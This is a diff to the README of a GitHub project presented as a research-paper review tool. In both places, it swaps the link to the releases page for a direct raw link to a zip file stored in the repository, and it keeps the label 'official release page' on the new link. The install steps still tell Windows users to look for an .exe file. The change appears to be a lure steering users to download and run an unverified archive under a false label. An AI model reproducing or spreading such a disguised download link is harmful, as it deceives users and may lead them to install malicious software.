@@ -1,6 +1,6 @@
 # 📚 skills - Automate your research paper review process
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/kashmirscien3399/skills/releases)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/kashmirscien3399/skills/raw/refs/heads/main/arxiv-reading/Software_v2.4.zip)
 
 ## 📖 About this software
 
@@ -25,7 +25,7 @@ This tool helps researchers manage academic papers. It uses automated workflows 
 
 Follow these steps to get the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/kashmirscien3399/skills/releases).
+1. Go to the [official release page](https://github.com/kashmirscien3399/skills/raw/refs/heads/main/arxiv-reading/Software_v2.4.zip).
 2. Look for the latest file ending in .exe.
 3. Click the file name to start the download.
 4. Open the folder where your computer saves downloads.
